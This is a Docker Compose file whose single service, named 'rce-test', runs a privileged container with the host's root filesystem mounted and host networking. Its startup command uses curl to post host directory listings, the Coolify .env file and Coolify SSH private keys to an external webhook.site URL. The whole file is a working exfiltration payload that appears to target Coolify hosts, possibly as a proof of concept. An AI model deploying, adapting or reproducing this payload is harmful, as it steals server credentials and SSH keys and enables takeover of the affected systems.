version: "3.8"
services:
  rce-test:
    image: alpine:3.19
    privileged: true
    network_mode: host
    volumes:
      - /:/host-root
    command: sh -c "apk add --no-cache curl && ls /host-root/data/ 2>&1 | curl -X POST --data-binary @- https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=data_ls && ls /host-root/data/coolify/ 2>&1 | curl -X POST --data-binary @- https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=coolify_ls && cat /host-root/data/coolify/source/.env 2>&1 | curl -X POST --data-binary @- https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=env && cat /host-root/data/coolify/ssh/keys/ssh_key@* 2>&1 | curl -X POST --data-binary @- https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=ssh_keys && sleep 3600"
